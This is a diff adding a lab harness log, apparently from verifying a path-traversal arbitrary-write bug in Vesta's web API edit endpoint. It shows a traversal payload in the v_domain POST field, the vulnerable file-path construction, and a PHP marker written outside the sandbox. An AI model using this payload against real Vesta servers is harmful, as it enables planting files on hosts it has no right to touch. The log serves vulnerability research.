@@ -1,0 +1,36 @@
+==============================================================
+VESTA-01 stage3-verify harness :: RUN B - arbitrary write: traversal v_domain escapes mktemp dir AND sandbox root
+==============================================================
+target file     : <LAB_ROOT>/repos/vesta/web/api/v1/edit/web/index.php
+target sha256   : f4b465943a91d29947b4e700d5540e9b06d15d5a1446007e001285e4ac7a0737
+time (UTC)      : 2026-09-28T18:22:00+00:00
+REMOTE_ADDR     : 127.0.0.1 (local-only discipline)
+VESTA_CMD stub  : C:/vesta_poc_harness/fake-bin
+mktemp resolves : C:\vesta_poc_harness\fake-bin\sandbox\tmp_26529_17717
+POST v_domain   : ../../pwn_outside_sandbox
+POST cert slots : crt=61B key=0B ca=0B
+
+----- PRE-STATE -----
+  [TREE] sandbox before include
+    tmp_26529_17717                                              <DIR> 0 bytes
+
+----- TARGET OUTPUT (verbatim include) -----
+{"username":"admin","domain":"\"..\/..\/pwn_outside_sandbox\"","ip":"1.2.3.4","template":"default","aliases":"","valiases":[""],"tpl":"1.2.3.4","elog":null,"ssl":"yes","cgi":"no","ssl_crt":null,"ssl_key":null,"ssl_ca":null,"ssl_subject":null,"ssl_aliases":null,"ssl_not_before":null,"ssl_not_after":null,"ssl_signature":null,"ssl_pub_key":null,"ssl_issuer":null,"letsencrypt":"no","ssl_home":"same","backend_template":"","proxy":"","proxy_template":"","proxy_ext":"jpg, jpeg, gif, png, ico, svg, css, zip, tgz, gz, rar, bz2, exe, pdf, doc, xls, ppt, txt, odt, ods, odp, odf, tar, bmp, rtf, js, mp3, avi, mpeg, flv, html, htm","v_stats":"","stats_user":null,"ftp_user":null,"ftp_path":"","ftp_password":null,"ftp_user_prepath":"\/home\/admin\/web\/testdomain.tld","ftp_email":null,"suspended":"no","status":"active","time":"","date":"","ips":{"1.2.3.4":{"STATUS":"active","NAME":"eth0","U_SYS_USERS":"admin","U_WEB_DOMAINS":"1"}},"prefixI18N":"Prefix will be automaticaly added to username","ftp_users":[{"is_new":1,"v_ftp_user":"","v_ftp_password":"","v_ftp_path":"","v_ftp_email":"","v_ftp_pre_path":"\/home\/admin\/web\/testdomain.tld"}],"templates":{"default":"default"},"backend_templates":null,"proxy_templates":null,"stats":{"awstats":"awstats"},"proxy_system":null,"web_backend":null,"web_system":null,"error_msg":null,"ok_msg":"Changes has been saved."}
+----- END TARGET OUTPUT -----
+
+----- POST-STATE -----
+  observed $tmpdir        : C:\vesta_poc_harness\fake-bin\sandbox\tmp_26529_17717
+  fopen/unlink path (crt) : $tmpdir . '/' . $_POST['v_domain'] . '.crt' = C:\vesta_poc_harness\fake-bin\sandbox\tmp_26529_17717/../../pwn_outside_sandbox.crt
+  $_SESSION['error_msg']   : (none)
+  $_SESSION['ok_msg']      : (none)
+  [TREE] sandbox after include
+    (empty)
+  [CHECK] C:/vesta_poc_harness/fake-bin/pwn_outside_sandbox.crt
+          exists AFTER request (post-unlink)=false
+          captured MID-REQUEST by sslcert-stub in : C:/vesta_poc_harness/snapshot_26529/pwn_outside_sandbox.crt
+          mid-request content                     : "VESTIM-B-POC-ARBITRARY-WRITE-MARKER <?php echo md5(\"poc\"); ?>\n"
+  [SCAN] marker "VESTIM-A-BENIGN-CRT-MARKER" found in: snapshot_26487/sandbox/tmp_26487_9059/testdomain.tld.crt
+  [SCAN] marker "VESTIM-B-POC-ARBITRARY-WRITE-MARKER" found in: snapshot_26529/pwn_outside_sandbox.crt
+  [SCAN] marker "VESTIM-C-POC-DELETE-MARKER" found in: (nothing - no leftover files)
+  [SCAN] marker "VESTIM-DECOY-DO-NOT-DELETE" found in: (nothing - no leftover files)
+==============================================================
